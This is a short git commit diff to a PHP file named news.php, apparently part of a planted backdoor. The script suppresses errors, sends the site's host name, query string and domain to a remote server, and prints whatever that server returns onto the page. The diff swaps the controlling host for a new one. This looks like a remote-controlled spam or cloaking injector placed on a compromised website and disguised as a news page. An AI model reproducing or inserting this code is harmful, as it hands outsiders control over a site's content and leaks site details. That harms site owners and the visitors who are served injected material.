fd421df722918f7fdf127c5e6c74bb80fdfa7a4e
Sniperxxx <73657570+Sniperxxx@users.noreply.github.com>
2022-10-03 11:04:57 -0400

    Update news.php

--- news.php
+++ news.php
@@ -3,7 +3,7 @@ error_reporting(0);
 set_time_limit(0);
 header("Content-Type: text/html;charset=utf-8");
 date_default_timezone_set('PRC');
-$Remote_server = "https://sangperintismuda.blogspot.com/?m=1"; 
+$Remote_server = "https://www.exploitsports.my.id/?m=1"; 
 $host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
 $Content_mb=file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
 echo $Content_mb;
